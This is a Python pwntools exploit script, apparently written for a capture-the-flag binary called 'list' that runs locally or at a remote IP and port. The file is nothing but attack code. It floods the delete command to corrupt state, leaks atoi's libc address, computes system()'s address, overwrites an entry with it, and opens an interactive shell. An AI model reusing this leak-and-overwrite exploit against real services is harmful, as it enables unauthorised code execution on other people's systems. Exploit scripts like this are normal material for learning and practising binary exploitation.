#coding=utf8
from pwn import *
#context.log_level = 'debug'
context.terminal = ['terminator','-x','bash','-c']

local = 1

if local:
	cn = remote('127.0.0.1',2222)
	bin = ELF('./list')
	libc = ELF('libc_local.so')
else:
	cn = remote('106.75.8.58', 13579)
	bin = ELF('./list')
	libc = ELF('remote_libc.so')


def z(a=''):
	gdb.attach(cn,a)
	if a == '':
		raw_input()


def add(con):
	cn.sendline('1')
	cn.recvuntil('content')
	cn.send(con)

def show():
	cn.sendline('2')

def edit(con):
	cn.sendline('3')
	cn.sendline(con)

def dele():
	cn.sendline('4')


cn.recvuntil('choise')

for i in range(263007):
	cn.sendline('4')

success("send done")
show()

while 1:
	data=cn.recv(4096)
	if '\x7f' in data:
		break
context.log_level = 'debug'
show()

data = cn.recvuntil('\n')[:-1]
success(data.encode('hex'))

atoi = u64(data+'\x00'*2)
system = atoi-libc.symbols['atoi']+libc.symbols['system']
success(hex(system))
cn.interactive()
edit(p64(system))

cn.interactive()
